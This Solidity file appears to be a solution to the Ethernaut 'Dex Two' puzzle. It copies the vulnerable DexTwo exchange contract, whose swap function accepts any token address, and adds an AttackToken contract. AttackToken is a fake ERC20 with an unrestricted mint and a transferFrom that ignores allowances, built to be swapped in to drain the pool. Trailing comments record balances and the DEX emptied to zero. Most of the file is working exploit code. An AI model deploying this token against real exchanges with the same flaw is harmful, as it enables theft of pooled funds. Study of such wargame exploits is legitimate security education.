// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
// import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract DexTwo /*is Ownable*/ {
  address public token1;
  address public token2;
  constructor() {}

//   function setTokens(address _token1, address _token2) public onlyOwner {
//     token1 = _token1;
//     token2 = _token2;
//   }

//   function add_liquidity(address token_address, uint amount) public onlyOwner {
//     IERC20(token_address).transferFrom(msg.sender, address(this), amount);
//   }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo /*is ERC20*/ {
  address private _dex;
//   constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
//         _mint(msg.sender, initialSupply);
//         _dex = dexInstance;
//   }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    // super._approve(owner, spender, amount);
  }
}


contract AttackToken  {
   mapping(address => uint256) public _balances;

    mapping(address => mapping(address => uint256)) public _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _balances[msg.sender] += 999999999;
    }

    function decimals() public view virtual  returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual  returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

   function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

//0xCC9Bb6A68Cba5Bec26438297dCC2A86677Cc53BE 0x0259C9498C32DdE1c594BB5CE56cd93907fA5166
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }


    }


   
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }

   
    function mint(uint256 amount) external {
      _balances[msg.sender] += amount;
      _totalSupply += amount;
      
    }
    function burn(uint256 amount) external {
      _balances[msg.sender] -= amount;
      _totalSupply -= amount;

    }

}

interface Dex {
  function token1() external view returns(address);
  function token2() external view returns(address);
  function swap(address from, address to, uint256 amount) external;
} 


// 155 me - 0  dex - 110
// a5  me -  110  dex - 0















